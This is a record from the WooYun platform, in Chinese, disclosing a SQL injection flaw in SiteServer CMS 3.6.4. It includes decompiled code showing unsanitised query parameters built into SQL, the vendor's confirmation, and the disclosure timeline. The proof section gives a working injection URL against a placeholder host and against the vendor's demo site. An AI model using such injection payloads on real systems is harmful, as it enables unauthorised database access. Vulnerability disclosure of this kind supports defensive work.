{"id": 5773, "wybug_id": "wooyun-2013-044145", "wybug_title": "siteserver最新版3.6.4 sql inject 第十蛋", "wybug_corp": "百容千域软件技术开发有限责任公司", "wybug_author": "小新", "wybug_date": "2013-11-26 22:01", "wybug_open_date": "2014-02-24 22:02", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["代码审计", "注射", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-11-30：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-01-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-01-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-02-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-02-24：\t细节向公众公开  简要描述： siteserver 最新版3.6.4 存在注入， 第12个注入 详细说明：  第11个注入存在/siteserver/cms/console_logSite.aspx用.NET Reflector 反编译SiteServer.CMS.dll这个文件查看代码如下：\npublic void Page_Load(object sender, EventArgs E){    int num;    Exception exception;    bool isPostBack;    int publishmentSystemID;    this.spContents.ControlToPaginate = this.rptContents;    if ((((uint) num) + ((uint) num)) >= 0)    {        this.spContents.ItemsPerPage = 0x19;        this.spContents.ConnectionString = BaiRongDataProvider.ConnectionString;        isPostBack = base.Request.QueryString[\"UserName\"] != null;        if (!isPostBack)        {            this.spContents.SelectCommand = DataProvider.LogDAO.GetSelectCommend();        }        else        {            this.spContents.SelectCommand = DataProvider.LogDAO.GetSelectCommend(base.PublishmentSystemID, base.Request.QueryString[\"LogType\"], base.Request.QueryString[\"UserName\"], base.Request.QueryString[\"Keyword\"], base.Request.QueryString[\"DateFrom\"], base.Request.QueryString[\"DateTo\"]);        }        this.spContents.SortField = \"ID\";        this.spContents.SortMode = SortMode.DESC;        goto Label_068A;    }\n上面几个参数进入下面\npublic string GetSelectCommend(int publishmentSystemID, string logType, string userName, string keyword, string dateFrom, string dateTo){    // This item is obfuscated and can not be translated.    StringBuilder builder;    bool flag;    bool flag2;    if (publishmentSystemID != 0)    {        goto Label_0475;    }    while (!string.IsNullOrEmpty(logType))    {        if (!StringUtils.EqualsIgnoreCase(logType, \"All\"))        {            goto Label_0475;        }        if (3 == 0)        {            goto Label_0016;        }        if (((uint) publishmentSystemID) >= 0)        {            break;        }    }    if (!string.IsNullOrEmpty(userName) || !string.IsNullOrEmpty(keyword))    {        goto Label_0475;    }    goto Label_046C;Label_0010:    if (!flag2)    {        goto Label_013D;    }Label_0016:    return (\"SELECT ID, PublishmentSystemID, ChannelID, ContentID, UserName, IPAddress, AddDate, Action, Summary FROM siteserver_Log \" + builder.ToString());......Label_02C8:    flag = true;    builder.AppendFormat(\"(UserName = '{0}')\", userName);Label_02DD:    flag2 = string.IsNullOrEmpty(keyword);    goto Label_029C;}\n几个Request.QueryString['xxx']都是可注入点   漏洞证明：  \nhttp://www.target.com/siteserver/cms/console_logSite.aspx?UserName='%20and%201=@@version%20and%201='1&Keyword=&DateFrom=&DateTo=&PublishmentSystemID=0&LogType=All\n\n\n官网\nhttp://2012.moban.siteserver.cn/siteserver/cms/console_logSite.aspx?UserName='%20and%201=@@version%20and%201='1&Keyword=&DateFrom=&DateTo=&PublishmentSystemID=0&LogType=All\n   修复方案：  对那几个参数过滤   版权声明：转载请注明来源 小新@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-11-27 09:31 厂商回复： 感谢小新的工作，尽快修正产品 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-11-26 23:46 |    \t\t未来还没来 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:5        | 每个人都期望成为主角，却不知道世界上从来...)\t\t \n  楼主充分证明了。千万别惹懂网络安全的人士。。。。    \n     2013-11-27 08:20 |    \t\tBloodwolf \t\t\t( 实习白帽子  |\t\t\t        Rank:47 漏洞数:8        | whoami)\t\t \n  话说楼主去找下discuz的去！    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}